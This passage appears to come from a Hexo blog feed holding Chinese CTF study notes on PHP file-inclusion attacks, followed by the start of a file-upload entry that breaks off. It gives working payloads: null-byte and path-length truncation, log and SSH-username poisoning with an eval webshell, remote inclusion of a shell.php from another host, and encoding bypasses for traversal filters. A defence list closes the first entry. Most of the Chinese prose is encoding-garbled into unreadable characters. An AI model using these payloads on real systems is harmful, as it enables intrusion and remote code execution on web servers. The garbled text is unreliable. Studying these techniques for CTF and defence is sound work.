proç‰ˆæœ¬ä¸è¦è¶…è¿‡6.3.2)</li></ul><h3 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h3><p>æˆªæ–­çš„æ ¸å¿ƒï¼Œå°±æ˜¯ <code>chr(0)</code>è¿™ä¸ªå­—ç¬¦ã€‚å…ˆè¯´ä¸€ä¸‹è¿™ä¸ªå­—ç¬¦ï¼Œè¿™ä¸ªå­—ç¬¦ä¸ä¸ºç©º <code>(Null)</code>ï¼Œä¹Ÿä¸æ˜¯ç©ºå­—ç¬¦ <code>(&quot;&quot;)</code>ï¼Œæ›´ä¸æ˜¯ç©ºæ ¼ã€‚ å½“ç¨‹åºåœ¨è¾“å‡ºå«æœ‰ <code>chr(0)</code>å˜é‡æ—¶ <code>chr(0)</code>åé¢çš„æ•°æ®ä¼šè¢«åœæ­¢ï¼Œæ¢å¥è¯è¯´ï¼Œå°±æ˜¯è¯¯æŠŠå®ƒå½“æˆç»“æŸç¬¦ï¼Œåé¢çš„æ•°æ®ç›´æ¥å¿½ç•¥ï¼Œè¿™å°±å¯¼è‡´æ¼æ´äº§ç”Ÿã€‚</p><h3 id="åœºæ™¯"><a href="#åœºæ™¯" class="headerlink" title="åœºæ™¯"></a>åœºæ™¯</h3><p>åŒ…å«æ—¶ï¼Œç»™æ–‡ä»¶åæ‹¼æ¥ä¸Šå…¶ä½™åç¼€ï¼Œä»è€Œé™åˆ¶äº†è¯»å–æ–‡ä»¶çš„ç±»å‹èŒƒå›´</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">include</span> (<span class="variable">$file</span>.<span class="string">&quot;.html&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><blockquote><p><code>file.php?file=../../../../../../boot.ini%00</code></p><p>%00æˆªæ–­åé¢â€.htmlâ€å†…å®¹ï¼Œå®é™…ä¸ŠåŒ…å«boot.ini</p></blockquote><h2 id="è·¯å¾„é•¿åº¦æˆªæ–­æ–‡ä»¶åŒ…å«"><a href="#è·¯å¾„é•¿åº¦æˆªæ–­æ–‡ä»¶åŒ…å«" class="headerlink" title="è·¯å¾„é•¿åº¦æˆªæ–­æ–‡ä»¶åŒ…å«"></a>è·¯å¾„é•¿åº¦æˆªæ–­æ–‡ä»¶åŒ…å«</h2><p>å¯ä»¥è¾“å…¥è¶…è¿‡æœ€å¤§è·¯åŠ²é•¿åº¦çš„ç›®å½•ï¼Œè¿™æ ·ç³»ç»Ÿå°±ä¼šå°†åé¢çš„è·¯å¾„ä¸¢å¼ƒï¼Œå¯¼è‡´æ‹“å±•åæˆªæ–­</p><h3 id="æ¡ä»¶-1"><a href="#æ¡ä»¶-1" class="headerlink" title="æ¡ä»¶"></a>æ¡ä»¶</h3><ul><li>Windowsä¸‹æœ€å¤§è·¯å¾„é•¿åº¦ä¸º256B</li><li>Linuxä¸‹æœ€å¤§è·¯å¾„é•¿åº¦ä¸º4096B(æµè§ˆå™¨æœ€å¤šåªèƒ½è¾“å…¥300å¤šä¸ªå­—ç¬¦ï¼Œæ‰€ä»¥éœ€è¦æŠ“åŒ…)</li></ul><p>æ–‡ä»¶ååå åŠ <code>./</code> ä¸è¿‡ä¸èƒ½è¶…è¿‡æ­¤æœåŠ¡å™¨çš„å®¹é‡é™åˆ¶</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file.php?file=test.txt/./....././</span><br></pre></td></tr></table></figure></div><h2 id="æ—¥å¿—æ–‡ä»¶åŒ…å«"><a href="#æ—¥å¿—æ–‡ä»¶åŒ…å«" class="headerlink" title="æ—¥å¿—æ–‡ä»¶åŒ…å«"></a>æ—¥å¿—æ–‡ä»¶åŒ…å«</h2><p>å…¸å‹çš„æ—¥å¿—æ–‡ä»¶åŒ…å«ï¼š</p><ul><li>ä¸­é—´ä»¶æ—¥å¿—æ–‡ä»¶åŒ…å«</li><li>sshæ—¥å¿—æ–‡ä»¶åŒ…å«</li></ul><h3 id="ä¸­é—´ä»¶æ—¥å¿—æ–‡ä»¶åŒ…å«"><a href="#ä¸­é—´ä»¶æ—¥å¿—æ–‡ä»¶åŒ…å«" class="headerlink" title="ä¸­é—´ä»¶æ—¥å¿—æ–‡ä»¶åŒ…å«"></a>ä¸­é—´ä»¶æ—¥å¿—æ–‡ä»¶åŒ…å«</h3><p>åˆ©ç”¨æ¡ä»¶ï¼š</p><ul><li>webä¸­é—´ä»¶æ—¥å¿—æ–‡ä»¶çš„å­˜å‚¨ä½ç½®å·²çŸ¥ï¼Œå¹¶ä¸”å…·æœ‰å¯è¯»æƒé™</li></ul><h4 id="åŸç†-1"><a href="#åŸç†-1" class="headerlink" title="åŸç†"></a>åŸç†</h4><p>ç”±äºè®¿é—®ç½‘ç«™ä¸‹å…¶ä»–æ–‡ä»¶ï¼Œä¸è®ºæ˜¯å¦è®¿é—®æˆåŠŸï¼Œéƒ½ä¼šè¢«å†™å…¥æ—¥å¿—æ–‡ä»¶ï¼Œå› æ­¤å¯ä»¥ç›´æ¥è®¿é—®ä¸€å¥è¯æœ¨é©¬ï¼Œå¦‚</p><ul><li>è®¿é—® <code>http://www.abc.com/xxx/&lt;?php @eval($_POST[123]);?&gt;</code></li><li>æ—¥å¿—æ–‡ä»¶è®°å½• <code>192.168.1.200 - - [09/Aug/2021:19:35:23 +0800] &quot;GET /xxx/%3C?php @eval($_POST[123]);?%3E HTTP/1.1&quot; 404 826....</code></li></ul><blockquote><p>æµè§ˆå™¨è¿›è¡Œäº†URLç¼–ç ï¼Œå¯¼è‡´ä¼ å…¥çš„ä»£ç ä¸èƒ½æ­£å¸¸ä½¿ç”¨<strong>å¯ä»¥é€šè¿‡bpæŠ“åŒ…çš„æ–¹å¼å†™å…¥æ¶æ„ä»£ç ï¼Œè¿™æ ·ä¸ä¼šè¢«ç¼–ç </strong></p><p>Apacheçš„ä¸­é—´ä»¶æ—¥å¿—æ–‡ä»¶å­˜åœ¨&#x2F;var&#x2F;log&#x2F;httpd&#x2F;ç›®å½•ä¸‹ï¼Œæ–‡ä»¶åå«access_log</p></blockquote><h3 id="sshæ—¥å¿—æ–‡ä»¶åŒ…å«"><a href="#sshæ—¥å¿—æ–‡ä»¶åŒ…å«" class="headerlink" title="sshæ—¥å¿—æ–‡ä»¶åŒ…å«"></a>sshæ—¥å¿—æ–‡ä»¶åŒ…å«</h3><p>SSHæ—¥å¿—æ–‡ä»¶åŒ…å«çš„åˆ©ç”¨æ¡ä»¶æ˜¯ï¼š</p><ul><li>SSHæ—¥å¿—è·¯å¾„å·²çŸ¥ï¼Œå¹¶ä¸”å…·æœ‰å¯è¯»æƒé™</li></ul><p>SSHæ—¥å¿—æ–‡ä»¶çš„é»˜è®¤è·¯å¾„ä¸º<code>/var/log/auth.log</code></p><h4 id="åˆ©ç”¨-1"><a href="#åˆ©ç”¨-1" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h4><p>sshè¿æ¥æ—¶å°†ç”¨æˆ·åè®¾ä¸ºæ¶æ„ä»£ç ï¼Œå†™å…¥æˆåŠŸåå†åŒ…å«å³å¯</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh &quot;&lt;?php @eval($_POST[123]);?&gt;&quot;@192.168.1.1</span><br></pre></td></tr></table></figure></div><h2 id="è¿œç¨‹æ–‡ä»¶åŒ…å«"><a href="#è¿œç¨‹æ–‡ä»¶åŒ…å«" class="headerlink" title="è¿œç¨‹æ–‡ä»¶åŒ…å«"></a>è¿œç¨‹æ–‡ä»¶åŒ…å«</h2><h3 id="æ— é™åˆ¶è¿œç¨‹æ–‡ä»¶åŒ…å«"><a href="#æ— é™åˆ¶è¿œç¨‹æ–‡ä»¶åŒ…å«" class="headerlink" title="æ— é™åˆ¶è¿œç¨‹æ–‡ä»¶åŒ…å«"></a>æ— é™åˆ¶è¿œç¨‹æ–‡ä»¶åŒ…å«</h3><p>é€šè¿‡URLçš„å½¢å¼åŒ…å«åˆ°å…¶ä»–æœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶ï¼Œä»¥åŠæ‰§è¡Œæ–‡ä»¶ä¸­çš„æ¶æ„ä»£ç </p><p>æ¡ä»¶</p><div class="highlight-container" data-rel="Ini"><figure class="iseeu highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">allow_url_fopen</span>=<span class="literal">on</span></span><br><span class="line"><span class="attr">allow_url_include</span>=<span class="literal">on</span></span><br></pre></td></tr></table></figure></div><p>payload <code>http://www.abc.com/file.php?file=http://192.168.2.1/shell.php</code></p><h3 id="æœ‰é™åˆ¶çš„è¿œç¨‹æ–‡ä»¶åŒ…å«"><a href="#æœ‰é™åˆ¶çš„è¿œç¨‹æ–‡ä»¶åŒ…å«" class="headerlink" title="æœ‰é™åˆ¶çš„è¿œç¨‹æ–‡ä»¶åŒ…å«"></a>æœ‰é™åˆ¶çš„è¿œç¨‹æ–‡ä»¶åŒ…å«</h3><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>].<span class="string">&quot;.html&quot;</span>);</span><br></pre></td></tr></table></figure></div><h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><ul><li><p>å¯ä»¥åœ¨é—®å·åé¢æ·»åŠ htmlå­—ç¬¦ä¸²ï¼Œé—®å·åé¢çš„æ‹“å±•åä¼šè¢«å½“åšæŸ¥è¯¢ï¼Œä»è€Œç»•è¿‡è¿‡æ»¤<br><code>file.php?filename=http://192.168.2.1/shell.php?</code></p></li><li><p>å¯ä»¥åœ¨#åé¢æ·»åŠ HTMLå­—ç¬¦ä¸²ï¼Œ#ä¼šæˆªæ–­åé¢çš„æ‹“å±•åï¼Œä»è€Œç»•è¿‡æ‹“å±•åè¿‡æ»¤.#çš„URLç¼–ç ä¸º%23</p><p><code>file.php?filename=http://192.168.2.1/shell.php%23</code></p></li><li><p>ç©ºæ ¼ç»•è¿‡</p></li></ul><p>â€‹<code>file.php?filename=http://192.168.2.1/php.txt%20</code></p><h2 id="phpä¼ªåè®®"><a href="#phpä¼ªåè®®" class="headerlink" title="phpä¼ªåè®®"></a>phpä¼ªåè®®</h2><p>è¯¦è§phpä¼ªåè®®å­¦ä¹ ç¬”è®°</p><h2 id="ç¼–ç ç»•è¿‡"><a href="#ç¼–ç ç»•è¿‡" class="headerlink" title="ç¼–ç ç»•è¿‡"></a>ç¼–ç ç»•è¿‡</h2><p>æœåŠ¡å™¨ç«¯å¸¸å¸¸ä¼šå¯¹äº..&#x2F;ç­‰åšä¸€äº›è¿‡æ»¤ï¼Œå¯ä»¥ç”¨ä¸€äº›ç¼–ç æ¥è¿›è¡Œç»•è¿‡ã€‚<br><strong>1.åˆ©ç”¨urlç¼–ç </strong></p><ul><li>..&#x2F;<ul><li>%2e%2e%2f</li><li>..%2f</li><li>%2e%2e&#x2F;</li></ul></li><li>..\<ul><li>%2e%2e%5c</li><li>..%5c</li><li>%2e%2e\</li></ul></li></ul><p><strong>2.äºŒæ¬¡ç¼–ç </strong></p><ul><li>..&#x2F;<ul><li>%252e%252e%252f</li></ul></li><li>..\<ul><li>%252e%252e%255c</li></ul></li></ul><p><strong>3.å®¹å™¨&#x2F;æœåŠ¡å™¨çš„ç¼–ç æ–¹å¼</strong></p><ul><li>..&#x2F;<ul><li>..%c0%af<ul><li>æ³¨ï¼š<a class="link"   href="https://security.stackexchange.com/questions/48879/why-does-directory-traversal-attack-c0af-work" >Why does Directory traversal attack %C0%AF work? <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li></ul></li><li>%c0%ae%c0%ae&#x2F;<ul><li>æ³¨ï¼šjavaä¸­ä¼šæŠŠâ€%c0%aeâ€è§£æä¸ºâ€\uC0AEâ€ï¼Œæœ€åè½¬ä¹‰ä¸ºASCCIIå­—ç¬¦çš„â€.â€ï¼ˆç‚¹ï¼‰</li><li>Apache Tomcat Directory Traversal(Apache Tomcat ç›®å½•éå†)</li></ul></li></ul></li><li>..\<ul><li>..%c1%9c</li></ul></li></ul><h2 id="é‡åˆ°æŒ‡å®šåç¼€çš„æƒ…å†µ"><a href="#é‡åˆ°æŒ‡å®šåç¼€çš„æƒ…å†µ" class="headerlink" title="é‡åˆ°æŒ‡å®šåç¼€çš„æƒ…å†µ"></a>é‡åˆ°æŒ‡å®šåç¼€çš„æƒ…å†µ</h2><p>æ¥ç€è€ƒè™‘æŒ‡å®šåç¼€çš„æƒ…å†µã€‚æµ‹è¯•ä»£ç :</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$file</span>.<span class="string">&#x27;/test/test.php&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><h3 id="è§£å†³ï¼šURL"><a href="#è§£å†³ï¼šURL" class="headerlink" title="è§£å†³ï¼šURL"></a><strong>è§£å†³ï¼šURL</strong></h3><p>urlæ ¼å¼</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">protocol://hostname[:port]/path/[;parameters][?query]#fragment</span><br></pre></td></tr></table></figure></div><p>åœ¨è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´ï¼ˆRFIï¼‰ä¸­ï¼Œå¯ä»¥åˆ©ç”¨queryï¼ˆ?ï¼‰æˆ–fragmentï¼ˆ#ï¼‰æ¥ç»•è¿‡åç¼€é™åˆ¶ã€‚é‚£ä¹ˆåˆ©ç”¨æ¡ä»¶å°±éœ€è¦æ˜¯ï¼š</p><ol><li><code>allow_url_fopen = On</code></li><li><code>allow_url_include = On</code></li></ol><h3 id="å§¿åŠ¿ä¸€ï¼šqueryï¼ˆ-ï¼‰"><a href="#å§¿åŠ¿ä¸€ï¼šqueryï¼ˆ-ï¼‰" class="headerlink" title="å§¿åŠ¿ä¸€ï¼šqueryï¼ˆ?ï¼‰"></a><strong>å§¿åŠ¿ä¸€ï¼šqueryï¼ˆ?ï¼‰</strong></h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=http://remoteaddr/remoteinfo.txt?</span><br></pre></td></tr></table></figure></div><p>åˆ™åŒ…å«çš„æ–‡ä»¶ä¸º <code>http://remoteaddr/remoteinfo.txt?/test/test.php</code><br>é—®å·åé¢çš„éƒ¨åˆ†<code>/test/test.php</code>ï¼Œä¹Ÿå°±æ˜¯æŒ‡å®šçš„åç¼€è¢«å½“ä½œqueryä»è€Œè¢«ç»•è¿‡ã€‚</p><h3 id="å§¿åŠ¿äºŒï¼šfragmentï¼ˆ-23-ï¼‰"><a href="#å§¿åŠ¿äºŒï¼šfragmentï¼ˆ-23-ï¼‰" class="headerlink" title="å§¿åŠ¿äºŒï¼šfragmentï¼ˆ#(%23)ï¼‰"></a><strong>å§¿åŠ¿äºŒï¼šfragmentï¼ˆ#(%23)ï¼‰</strong></h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=http://remoteaddr/remoteinfo.txt%23</span><br></pre></td></tr></table></figure></div><p>åˆ™åŒ…å«çš„æ–‡ä»¶ä¸º <code>http://remoteaddr/remoteinfo.txt#/test/test.php</code><br>é—®å·åé¢çš„éƒ¨åˆ†<code>/test/test.php</code>ï¼Œä¹Ÿå°±æ˜¯æŒ‡å®šçš„åç¼€è¢«å½“ä½œfragmentä»è€Œè¢«ç»•è¿‡ã€‚æ³¨æ„éœ€è¦æŠŠ<code>#</code>è¿›è¡Œurlç¼–ç ä¸º<code>%23</code>ã€‚</p><h2 id="é˜²å¾¡æ–¹æ¡ˆ"><a href="#é˜²å¾¡æ–¹æ¡ˆ" class="headerlink" title="é˜²å¾¡æ–¹æ¡ˆ"></a>é˜²å¾¡æ–¹æ¡ˆ</h2><ol><li>åœ¨å¾ˆå¤šåœºæ™¯ä¸­éƒ½éœ€è¦å»åŒ…å«webç›®å½•ä¹‹å¤–çš„æ–‡ä»¶ï¼Œå¦‚æœphpé…ç½®äº†<code>open_basedir</code>ï¼Œåˆ™ä¼šåŒ…å«å¤±è´¥ã€‚æ‰€ä»¥PHP ä¸­ä½¿ç”¨<code>open_basedir</code>é…ç½®é™åˆ¶è®¿é—®åœ¨æŒ‡å®šçš„åŒºåŸŸã€‚</li><li>åšå¥½æ–‡ä»¶çš„æƒé™ç®¡ç†ã€‚</li><li>å¯¹å¯ä»¥åŒ…å«çš„æ–‡ä»¶è¿›è¡Œé™åˆ¶ï¼Œå¯ä»¥é‡‡ç”¨ç™½åå•çš„æ–¹å¼ï¼Œæˆ–è®¾ç½®å¯ä»¥åŒ…å«çš„ç›®å½•ã€‚</li><li>å¯¹å±é™©å­—ç¬¦è¿›è¡Œè¿‡æ»¤ï¼Œæ¯”å¦‚è¿‡æ»¤<code>.</code>ï¼ˆç‚¹ï¼‰<code>/</code>ï¼ˆåæ–œæ ï¼‰<code>\</code>ï¼ˆåæ–œæ ï¼‰ç­‰ç‰¹æ®Šå­—ç¬¦ã€‚</li><li>å°½é‡å°†allow_url_fopenå’Œallow_url_includeé…ç½®ä¸ºoffï¼Œä¸è¿‡åƒæœ‰äº›ä¼ªåè®®è¿˜æ˜¯èƒ½ä½¿ç”¨ï¼Œä¸è¿‡èƒ½å°½é‡offè¿˜æ˜¯offå§ã€‚</li><li>å°½é‡ä¸ä½¿ç”¨åŠ¨æ€åŒ…å«ç­‰ç­‰</li></ol>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ–‡ä»¶ä¸Šä¼ </title>
      <link href="/2022/03/04/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
      <url>/2022/03/04/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="æ–‡ä»¶ä¸Šä¼ "><a href="#æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="æ–‡ä»¶ä¸Šä¼ "></a>æ–‡ä»¶ä¸Šä¼ </h1><h2 id="0x01-ç®€ä»‹"><a href="#0x01-ç®€ä»‹" class="headerlink" title="0x01 ç®€ä»‹"></a>0x01 ç®€ä»‹</h2><h3 id="æ–‡ä»¶ä¸Šä¼ æ¼æ´çš„ç”±æ¥"><a href="#æ–‡ä»¶ä¸Šä¼ æ¼æ´çš„ç”±æ¥" class="headerlink" title="æ–‡ä»¶ä¸Šä¼ æ¼æ´çš„ç”±æ¥"></a>æ–‡ä»¶ä¸Šä¼ æ¼æ´çš„ç”±æ¥</h3><p>é€šè¿‡å®¢æˆ·ç«¯çš„POSTè¯·æ±‚ä¸Šä¼ æ–‡ä»¶ï¼Œç”±äºæ¶ˆæ¯ä¸»ä½“å°±æ˜¯ä¸€äº›ä¸Šä¼ ä¿¡æ¯ã€‚å‰ç«¯ä¸Šä¼ é¡µé¢éœ€è¦æŒ‡å®š enctype ä¸º multipart&#x2F;form-data æˆ–è€… Multipart&#x2F;form-data æ‰èƒ½æ­£å¸¸ä¸Šä¼ æ–‡ä»¶ã€‚</p><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&#x27;&#x27;</span> <span class="attr">enctype</span>=<span class="string">&#x27;multipart/form-data&#x27;</span> <span class="attr">method</span>=<span class="string">&#x27;POST&#x27;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&#x27;file&#x27;</span> <span class="attr">name</span>=<span class="string">&#x27;file&#x27;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure></div><blockquote><p>multipart æ ¼å¼çš„æ•°æ®ä¼šå°†ä¸€ä¸ªè¡¨å•æ‹†åˆ†ä¸ºå¤šä¸ªéƒ¨åˆ†ï¼ˆpartï¼‰ï¼Œæ¯ä¸ªéƒ¨åˆ†å¯¹åº”ä¸€ä¸ªè¾“å…¥åŸŸã€‚åœ¨ä¸€èˆ¬çš„è¡¨å•è¾“å…¥åŸŸä¸­ï¼Œ<br>å®ƒæ‰€å¯¹åº”çš„éƒ¨åˆ†ä¸­ä¼šæ”¾ç½®æ–‡æœ¬å‹æ•°æ®ï¼Œä½†æ˜¯å¦‚æœä¸Šä¼ æ–‡ä»¶çš„è¯ï¼Œå®ƒæ‰€å¯¹åº”çš„éƒ¨åˆ†å¯ä»¥æ˜¯äºŒè¿›åˆ¶ï¼Œä¸‹é¢å±•ç°äº† multipart çš„è¯·æ±‚ä½“ï¼š</p></blockquote><p>filename å­—æ®µæ˜¯å¿…è¦çš„ï¼ŒæŒ‡å®šäº†<u>ä¸Šä¼ æ—¶çš„é‚£ä¸ªæ–‡ä»¶çš„æ–‡ä»¶å</u>ã€‚å…¶ä»–çš„å¯æœ‰å¯æ— </p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Content-Type:multipart/form-data; boundary=----WebKitFormBoundaryrGKCBY7qhFd3TrwA</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryrGKCBY7qhFd3TrwA</span><br><span class="line"></span><br><span class="line">Content-Disposition: form-data; name=&quot;text&quot;</span><br><span class="line"></span><br><span class="line">title</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryrGKCBY7qhFd3TrwA</span><br><span class="line"></span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;chrome.png&quot;</span><br><span class="line"></span><br><span class="line">Content-Type: image/png</span><br><span class="line"></span><br><span class="line">PNG ... content of chrome.png ...</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryrGKCBY7qhFd3TrwA--</span><br></pre></td></tr></table></figure></div><p>è¿™é‡Œåœ¨æ¯ä¸ªå­—æ®µä¹‹é—´ä½¿ç”¨ â€”â€”â€”WebKitFormBoundaryxxx éš”å¼€ï¼Œboundaryæ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œç”¨æ¥åˆ‡åˆ†æ•°æ®ã€‚</p><p>è¿™é‡Œå°±å’Œ post è¯·æ±‚ä¸€æ ·ï¼Œå¯ä»¥è‡ªå·±å¢åŠ å‚æ•°ï¼Œå°±å½¢å¦‚ä¸‹é¢è¿™æ ·ï¼Œå°†å‚æ•°åæ”¾åˆ° name é‡Œï¼Œå‚æ•°å€¼æ”¾åˆ°ä¸‹é¢ï¼š</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">------WebKitFormBoundary1PkqXeou9aUAIMHr</span><br><span class="line">Content-Disposition: form-data; name=&quot;filename&quot;</span><br><span class="line"></span><br><span class="line">1.php</span><br></pre></td></tr></table></figure></div><p>é‚£ä¹ˆè¿™é‡Œå°±å¢åŠ äº†ä¸€ä¸ªå‚æ•° filename &#x3D; â€˜1.phpâ€™</p><h3 id="äº§ç”ŸåŸå› "><a href="#äº§ç”ŸåŸå› " class="headerlink" title="äº§ç”ŸåŸå› "></a>äº§ç”ŸåŸå› </h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.å¯¹äºä¸Šä¼ æ–‡ä»¶çš„åç¼€åï¼ˆæ‰©å±•åï¼‰æ²¡æœ‰åšè¾ƒä¸ºä¸¥æ ¼çš„é™åˆ¶</span><br><span class="line">2.å¯¹äºä¸Šä¼ æ–‡ä»¶çš„MIMETYPE(ç”¨äºæè¿°æ–‡ä»¶çš„ç±»å‹çš„ä¸€ç§è¡¨è¿°æ–¹æ³•) æ²¡æœ‰åšæ£€æŸ¥</span><br><span class="line">3.æƒé™ä¸Šæ²¡æœ‰å¯¹äºä¸Šä¼ çš„æ–‡ä»¶ç›®å½•è®¾ç½®ä¸å¯æ‰§è¡Œæƒé™ï¼Œï¼ˆå°¤å…¶æ˜¯å¯¹äºshebangç±»å‹çš„æ–‡ä»¶ï¼‰</span><br><span class="line">4.å¯¹äºweb serverå¯¹äºä¸Šä¼ æ–‡ä»¶æˆ–è€…æŒ‡å®šç›®å½•çš„è¡Œä¸ºæ²¡æœ‰åšé™åˆ¶</span><br></pre></td></tr></table></figure></div><h1 id="å¸¸è§Bypass"><a href="#å¸¸è§Bypass" class="headerlink" title="å¸¸è§Bypass"></a>å¸¸è§Bypass</h1><h2 id="å‰ç«¯æ£€æµ‹-JSéªŒè¯"><a href="#å‰ç«¯æ£€æµ‹-JSéªŒè¯" class="headerlink" title="å‰ç«¯æ£€æµ‹-JSéªŒè¯"></a>å‰ç«¯æ£€æµ‹-JSéªŒè¯</h2><p>å‰ç«¯å¯¹ä¸Šä¼ æ–‡ä»¶åç¼€è¿›è¡Œæ£€æŸ¥ï¼Œå¸¸è§jsä»£ç </p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">checkFile</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> file = <span class="variable language_">document</span>.<span class="title function_">getElementsByName</span>(<span class="string">&#x27;upload_file&#x27;</span>)[<span class="number">0</span>].<span class="property">value</span>;</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&quot;è¯·é€‰æ‹©è¦ä¸Šä¼ çš„æ–‡ä»¶!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//å®šä¹‰å…è®¸ä¸Šä¼ çš„æ–‡ä»¶ç±»å‹</span></span><br><span class="line">    <span class="keyword">var</span> allow_ext = <span class="string">&quot;.jpg|.png|.gif&quot;</span>;</span><br><span class="line">    <span class="comment">//æå–ä¸Šä¼ æ–‡ä»¶çš„ç±»å‹</span></span><br><span class="line">    <span class="keyword">var</span> ext_name = file.<span class="title function_">substring</span>(file.<span class="title function_">lastIndexOf</span>(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">    <span class="comment">//åˆ¤æ–­ä¸Šä¼ æ–‡ä»¶ç±»å‹æ˜¯å¦å…è®¸ä¸Šä¼ </span></span><br><span class="line">    <span class="keyword">if</span> (allow_ext.<span class="title function_">indexOf</span>(ext_name + <span class="string">&quot;|&quot;</span>) == -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> errMsg = <span class="string">&quot;è¯¥æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ ï¼Œè¯·ä¸Šä¼ &quot;</span> + allow_ext + <span class="string">&quot;ç±»å‹çš„æ–‡ä»¶,å½“å‰æ–‡ä»¶ç±»å‹ä¸ºï¼š&quot;</span> + ext_name;</span><br><span class="line">        <span class="title function_">alert</span>(errMsg);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h4 id="æŠ“åŒ…ä¿®æ”¹åç¼€ç»•è¿‡"><a 